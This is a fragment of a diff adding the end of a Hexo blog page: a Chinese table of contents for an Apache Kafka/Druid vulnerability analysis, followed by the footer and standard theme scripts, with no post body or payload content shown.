+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">一、漏洞简介</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Apache-Kafka"><span class="nav-number">1.0.1.</span> <span class="nav-text">Apache Kafka</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Apache-Druid"><span class="nav-number">1.0.2.</span> <span class="nav-text">Apache Druid</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.0.3.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="nav-number">1.0.4.</span> <span class="nav-text">漏洞影响范围</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81KafkaConsumer"><span class="nav-number">2.</span> <span class="nav-text">二、KafkaConsumer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81Apache-Druid%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-number">3.</span> <span class="nav-text">三、Apache Druid环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">四、漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E8%BE%93%E5%85%A5"><span class="nav-number">4.1.</span> <span class="nav-text">前端输入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">4.2.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-number">4.3.</span> <span class="nav-text">payload</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">白给</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+            <div class="deploy-info info-item">
+                
+                    本站由 <span class="tooltip" data-content="GitHub Pages"><img src="/images/deploy-provider/github.png"></span> 提供部署服务
+                
+            </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
